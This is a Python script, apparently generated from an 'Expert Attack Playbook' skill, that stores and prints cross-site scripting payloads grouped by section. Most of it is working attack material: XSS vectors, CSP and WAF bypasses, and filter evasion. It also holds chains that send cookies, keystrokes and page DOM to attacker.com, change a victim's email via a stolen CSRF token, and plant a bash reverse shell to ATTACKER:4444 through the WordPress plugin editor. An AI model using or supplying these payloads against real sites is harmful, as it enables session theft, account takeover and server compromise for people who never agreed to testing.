#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
AUTO-GENERATED from Cybermes skill: hack-skills/xss-cross-site-scripting

Skill: SKILL: Cross-Site Scripting (XSS) — Expert Attack Playbook
Desc : >-

Run:  python hack-skills-xss-cross-site-scripting.py --help
      python hack-skills-xss-cross-site-scripting.py --list
      python hack-skills-xss-cross-site-scripting.py --dump <section>
"""
import sys, json, argparse

NAME = 'hack-skills/xss-cross-site-scripting'
TITLE = 'SKILL: Cross-Site Scripting (XSS) — Expert Attack Playbook'
DESCRIPTION = '>-'

PAYLOADS = {
    'main': ["name: xss-cross-site-scripting", "description: >-", "XSS playbook. Use when user-controlled content reaches HTML, attributes, JavaScript, DOM sinks, uploads, or multi-context rendering paths."],
    'skill-cross-site-scripting-xss-expert-attack-playbook': [],
    '0-related-routing': [],
    'extended-scenarios': ["Also load [SCENARIOS.md](./SCENARIOS.md) when you need:", "- Django debug page XSS (CVE-2017-12794) \u2014 duplicate key error \u2192 unescaped exception \u2192 XSS", "- UTF-7 XSS for legacy IE environments (`+ADw-script+AD4-`)", "- HttpOnly bypass methodology \u2014 proxy-the-browser, session riding, CSRF-via-XSS", "- XS-Leaks side channel attacks \u2014 timing oracle, cache probing, `performance.now()` measurement", "- Session fixation via XSS \u2014 pre-set session ID before victim login", "- DOM clobbering techniques for CSP-restricted environments"],
    'advanced-tricks': ["Also load [ADVANCED_XSS_TRICKS.md](./ADVANCED_XSS_TRICKS.md) when you need:", "- mXSS / DOMPurify bypass \u2014 namespace confusion, `<noscript>` parsing differential, form/table restructuring", "- DOM Clobbering \u2014 property override via `id`/`name`, HTMLCollection, deep property chains", "- Modern framework XSS \u2014 React `dangerouslySetInnerHTML`, Vue `v-html`, Angular `bypassSecurityTrust*`, Next.js SSR", "- Trusted Types bypass \u2014 default policy abuse, non-TT sinks, policy passthrough", "- Service Worker XSS persistence \u2014 malicious SW registration, fetch interception, post-patch survival", "- PDF/SVG/MathML XSS vectors, polyglot payloads, browser-specific tricks", "- XS-Leaks & side channels \u2014 timing oracle, frame counting, cache probing, error event oracle", "Before broad payload spraying, you can first load:", "- [upload insecure files](../upload-insecure-files/SKILL.md) when you need the full upload path: validation, storage, preview, and sharing behavior"],
    'quick-context-picks': ["```html", "<svg onload=alert(1)>", "<img src=1 onerror=alert(1)>", "\" autofocus onfocus=alert(1)//", "'</script><svg onload=alert(1)>", "javascript:alert(1)", "data:text/html,<svg onload=alert(1)>"],
    '1-injection-context-matrix': ["Identify context **before** picking a payload. Wrong context = wasted attempts."],
    '2-multi-reflection-attacks': ["When input reflects in **multiple places** on the same page \u2014 single payload triggers from all points:", "```html", "<!-- Double reflection -->", "'onload=alert(1)><svg/1='", "'>alert(1)</script><script/1='", "*/alert(1)</script><script>/*", "<!-- Triple reflection -->", "*/alert(1)\">'onload=\"/*<svg/1='", "`-alert(1)\">'onload=\"`<svg/1='", "*/</script>'>alert(1)/*<script/1='", "<!-- Two separate inputs (p= and q=) -->", "p=<svg/1='&q='onload=alert(1)>"],
    '3-advanced-injection-vectors': [],
    'dom-insert-injection-when-reflection-is-in-dom-not-source': ["Input inserted via `.innerHTML`, `document.write`, jQuery `.html()`:", "```html", "<img src=1 onerror=alert(1)>", "<iframe src=javascript:alert(1)>", "For URL-controlled resource insertion:", "```html", "data:text/html,<img src=1 onerror=alert(1)>", "data:text/html,<iframe src=javascript:alert(1)>"],
    'php-self-path-injection': ["When URL itself is reflected in form `action`:", "https://target.com/page.php/\"><svg onload=alert(1)>?param=val", "Inject between `.php` and `?`, using leading `/`."],
    'file-upload-xss': ["**Filename injection** (when filename is reflected):", "\"><svg onload=alert(1)>.gif", "**SVG upload** (stored XSS via image upload accepting SVG):", "```xml", "<svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"alert(1)\"/>", "**Metadata injection** (when EXIF is reflected):", "```bash", "exiftool -Artist='\"><svg onload=alert(1)>' photo.jpeg"],
    'postmessage-xss-no-origin-check': ["When page has `window.addEventListener('message', ...)` without origin validation:", "```html", "<iframe src=\"TARGET_URL\" onload=\"frames[0].postMessage('INJECTION','*')\">"],
    'postmessage-origin-bypass': ["When origin IS checked but uses `.includes()` or prefix match:", "http://facebook.com.ATTACKER.com/crosspwn.php?target=//victim.com/page&msg=<script>alert(1)</script>", "Attacker controls `facebook.com.ATTACKER.com` subdomain."],
    'xml-based-xss': ["Response has `text/xml` or `application/xml`:", "```html", "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\">alert(1)</x:script>", "<x:script xmlns:x=\"http://www.w3.org/1999/xhtml\" src=\"//attacker.com/1.js\"/>"],
    'script-injection-without-closing-tag': ["When there IS a `</script>` tag later in the page:", "```html", "<script src=data:,alert(1)>", "<script src=//attacker.com/1.js>"],
    '4-csp-bypass-techniques': [],
    'jsonp-endpoint-bypass-allow-listed-domain-has-jsonp': ["```html", "<script src=\"https://www.google.com/complete/search?client=chrome&jsonp=alert(1);\">", "</script>"],
    'angularjs-cdn-bypass-allow-listed-ajax-googleapis-com': ["```html", "<script src=\"https://ajax.googleapis.com/ajax/libs/angularjs/1.6.0/angular.min.js\"></script>", "<x ng-app ng-csp>{{constructor.constructor('alert(1)')()}}</x>"],
    'angular-expressions-server-encodes-html-but-angularjs-evaluates': ["When `{{1+1}}` evaluates to `2` on page \u2014 classic CSTI indicator:", "```javascript", "// Angular 1.x sandbox escape:", "{{constructor.constructor('alert(1)')()}}", "// Angular 1.5.x:", "{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}"],
    'base-uri-injection-csp-without-base-uri-restriction': ["```html", "<base href=\"https://attacker.com/\">", "Relative `<script src=...>` loads from attacker's server."],
    'dom-based-via-dangling-markup': ["When CSP blocks script but allows `img`:", "```html", "<img src='https://attacker.com/log?", "Leaks subsequent page content to attacker."],
    '5-filter-and-waf-bypass': [],
    'parameter-name-attack-waf-checks-value-not-name': ["When parameter names are reflected (e.g., in JSON output):", "?\"></script><base%20c%3D=href%3Dhttps:\\mysite>", "Payload is the **parameter name**, not value."],
    'encoding-chains': ["%253C  \u2192 double-encoded <", "%26lt; \u2192 HTML entity double-encoding", "<%00h2 \u2192 null byte injection", "%0d%0a \u2192 CRLF inside tag", "Test sequence: reflect \u2192 encoding behavior \u2192 identify filter logic \u2192 mutate."],
    'tag-mutation-blacklist-bypass': ["```html", "<ScRipt>  \u2190 case variation", "</script/x>  \u2190 trailing garbage", "<script  \u2190 incomplete (relies on later >)", "<%00iframe  \u2190 null byte", "<svg/onload=  \u2190 slash instead of space"],
    'fragmented-injection-strip-tags-bypass': ["Filter strips `<x>...</x>`:", "\"o<x>nmouseover=alert<x>(1)//", "\"autof<x>ocus o<x>nfocus=alert<x>(1)//"],
    'vectors-without-event-handlers': ["```html", "<form action=javascript:alert(1)><input type=submit>", "<form><button formaction=javascript:alert(1)>click", "<isindex action=javascript:alert(1) type=submit value=click>", "<object data=javascript:alert(1)>", "<iframe srcdoc=<svg/o&#x6Eload&equals;alert&lpar;1)&gt;>", "<math><brute href=javascript:alert(1)>click"],
    '6-second-order-xss': ["**Definition**: Input is stored (often normalized/HTML-encoded), then later **retrieved** and inserted into DOM without re-encoding.", "**Classic trigger payload** (bypasses immediate HTML encoding):", "&lt;svg/onload&equals;alert(1)&gt;", "Check: profile fields, display names, forum posts \u2014 anywhere data is stored, then re-rendered in a different context (e.g., admin panel vs user-facing).", "**Stored \u2192 Admin context XSS**: most impactful \u2014 sign up with crafted username, wait for admin to view user list."],
    '7-blind-xss-methodology': ["Every parameter that is **not immediately reflected** should be tested for blind XSS:", "- Contact forms, feedback fields", "- User-agent / referer", "- Registration fields", "- Error log injections", "**Blind XSS callback payload** (remote JS file approach):", "```html", "\"><script src=//attacker.com/bxss.js></script>", "**Minimal collector** (hosted at `bxss.js`):", "```javascript", "var d = document;", "var msg = 'URL: '+d.URL+'\\nCOOKIE: '+d.cookie+'\\nDOM:\\n'+d.documentElement.innerHTML;", "fetch('https://attacker.com/collect?'+encodeURIComponent(msg));", "Use **XSS Hunter** or similar blind XSS platform for automated collection."],
    '8-xss-exploitation-chain': [],
    'cookie-steal': ["```javascript", "fetch('//attacker.com/?c='+document.cookie)", "// HttpOnly protected cookies \u2192 not stealable via JS, need CSRF or session fixation instead"],
    'keylogger': ["```javascript", "document.onkeypress = function(e) {", "fetch('//attacker.com/k?k='+encodeURIComponent(e.key));"],
    'csrf-via-xss-bypasses-csrf-protection-reads-csrf-token-from-dom': ["```javascript", "var r = new XMLHttpRequest();", "r.open('GET', '/account/settings', false);", "r.send();", "var token = /csrf_token['\":\\s]+([^'\"<\\s]+)/.exec(r.responseText)[1];", "var f = new XMLHttpRequest();", "f.open('POST', '/account/email/change', true);", "f.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');", "f.send('email=attacker@evil.com&csrf='+token);"],
    'wordpress-xss-rce-admin-session-hello-dolly-plugin': ["```javascript", "p = '/wp-admin/plugin-editor.php?';", "q = 'file=hello.php';", "s = '<?=`bash -i >& /dev/tcp/ATTACKER/4444 0>&1`;?>';", "a = new XMLHttpRequest();", "a.open('GET', p+q, 0); a.send();", "$ = '_wpnonce=' + /nonce\" value=\"([^\"]*?)\"/.exec(a.responseText)[1] +", "'&newcontent=' + encodeURIComponent(s) + '&action=update&' + q;", "b = new XMLHttpRequest();", "b.open('POST', p+q, 1);", "b.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');", "b.send($);", "b.onreadystatechange = function(){ if(this.readyState==4) fetch('/wp-content/plugins/hello.php'); }"],
    'browser-remote-control-js-command-shell': ["```javascript", "// Injected into victim:", "setInterval(function(){", "with(document)body.appendChild(createElement('script')).src='//ATTACKER:5855'", "},100)", "```bash"],
    'attacker-listener': ["while :; do printf \"j$ \"; read c; echo $c | nc -lp 5855 >/dev/null; done"],
    '9-decision-tree': ["Test XSS entry point", "\u251c\u2500\u2500 Input reflected in response?", "\u2502   \u251c\u2500\u2500 YES \u2192 Identify context (HTML / JS / attr / URL)", "\u2502   \u2502         \u2192 Select context-appropriate payload", "\u2502   \u2502         \u2192 If blocked \u2192 check filter behavior", "\u2502   \u2502         \u2502   \u2192 Try encoding, case mutation, fragmentation", "\u2502   \u2502         \u2502   \u2192 Check if parameter NAME is reflected (WAF gap)", "\u2502   \u2502         \u2514\u2500\u2500 Success \u2192 escalate (cookie steal / CSRF / RCE)", "\u2502   \u2514\u2500\u2500 NO  \u2192 Is it stored? \u2192 Inject blind XSS payload", "\u2502             Is it in DOM? \u2192 Check JS source for unsafe sinks", "\u2502                             (innerHTML, eval, document.write, location.href)", "\u2514\u2500\u2500 CSP present?", "\u251c\u2500\u2500 Check for JSONP endpoints on allow-listed domains", "\u251c\u2500\u2500 Check for AngularJS on CDN allow-list", "\u251c\u2500\u2500 Check for base-uri missing \u2192 <base> injection", "\u2514\u2500\u2500 Check for unsafe-eval or unsafe-inline exceptions"],
    '10-xss-testing-process-zseano-method': ["1. **Step 1** \u2014 Test non-malicious tags: `<h2>`, `<img>`, `<table>` \u2014 are they reflected raw?", "2. **Step 2** \u2014 Test incomplete tags: `<iframe src=//attacker.com/c=` (no closing `>`)", "3. **Step 3** \u2014 Encoding probes: `<%00h2`, `%0d`, `%0a`, `%09`, `%253C`", "4. **Step 4** \u2014 If filtering `<script>` and `onerror` but NOT `<script ` (without close): `<script src=//attacker.com?c=`", "5. **Step 5** \u2014 Blacklist check: does `<svg>` work? Does `<ScRiPt>` work?", "6. Note: **the same filter likely exists elsewhere** \u2014 if they filter `<script>` in search, do they filter it in file upload filename? In profile bio?", "**Key insight**: Filter presence = vulnerability exists, developer tried to patch. Chase that thread across the entire application."],
}

def main():
    ap = argparse.ArgumentParser(description=DESCRIPTION, formatter_class=argparse.RawDescriptionHelpFormatter)
    ap.add_argument("--list", action="store_true", help="list sections")
    ap.add_argument("--dump", metavar="SECTION", help="dump payloads for a section")
    ap.add_argument("--search", metavar="KEYWORD", help="search payloads")
    args = ap.parse_args()
    if args.list or not (args.dump or args.search):
        print("=== %s ===" % TITLE)
        print(DESCRIPTION)
        print()
        print("Sections (%d):" % len(PAYLOADS))
        for k in PAYLOADS:
            print("  -", k, "(%d payloads)" % len(PAYLOADS[k]))
        if args.list:
            return
    if args.dump:
        if args.dump not in PAYLOADS:
            print("Section not found. Available:", list(PAYLOADS.keys()))
            sys.exit(1)
        for p in PAYLOADS[args.dump]:
            print(p)
        return
    if args.search:
        q = args.search.lower()
        hits = 0
        for k, v in PAYLOADS.items():
            for p in v:
                if q in p.lower():
                    print("[%s] %s" % (k, p))
                    hits += 1
        print("\n%d hits" % hits)
        return

if __name__ == "__main__":
    main()